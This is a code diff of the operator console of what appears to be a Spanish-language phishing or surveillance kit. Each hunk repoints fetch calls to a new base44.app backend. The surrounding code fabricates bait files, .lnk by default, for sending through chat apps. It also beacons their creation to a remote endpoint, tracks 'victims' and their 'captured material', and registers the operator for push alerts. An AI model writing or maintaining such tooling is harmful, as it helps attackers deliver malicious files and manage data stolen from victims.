@@ -467,7 +467,7 @@ function ceboCrear() {
   $('ceboSt').textContent = '✓ listo — descarga';
   $('ceboRes').textContent = '✓ fabricado en tu dispositivo: ' + n + ' (' + mime + '). descargalo y envialo vos desde el chat que elijas — nadie más interviene.';
   $('ceboRes').style.color = '#f2d3d1';
-  fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-FABRICADO', ua: 'consola-owner', extra: JSON.stringify({ nombre: n, tipo: '.' + ceboTipo, origen: 'local-dispositivo' }) }) }).catch(e => {});
+  fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-FABRICADO', ua: 'consola-owner', extra: JSON.stringify({ nombre: n, tipo: '.' + ceboTipo, origen: 'local-dispositivo' }) }) }).catch(e => {});
 }
 ceboExt('lnk');
 function scanLeds() {
@@ -891,7 +891,7 @@ async function vaciarTodo() {
   const allIds = [];
   for (const uid in S.targets) (S.targets[uid].ids || []).forEach(id => allIds.push(id));
   try {
-    await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
+    await fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20DelVictim', {
       method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: allIds }) });
   } catch(e) {}
   S.targets = {}; S.orphans = []; S.activeUid = null;
@@ -904,7 +904,7 @@ async function eliminarVictima(uid) {
   if (!T) return;
   if (!confirm('Eliminar objetivo y todo su material capturado?')) return;
   try {
-    await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
+    await fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20DelVictim', {
       method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: T.ids || [] }) });
   } catch(e) {}
   (T.ids || []).forEach(id => S.seen.add(id));
@@ -936,7 +936,7 @@ async function enablePush() {
     await navigator.serviceWorker.ready;
     let sub = await reg.pushManager.getSubscription();
     if (!sub) sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlB64ToU8(PUSH_KEY) });
-    const r = await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20SavePush', {
+    const r = await fetch('https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20SavePush', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ endpoint: sub.endpoint, p256dh: bufToB64(sub.getKey('p256dh')), auth: bufToB64(sub.getKey('auth')), ua: navigator.userAgent.slice(0,200) })
     });
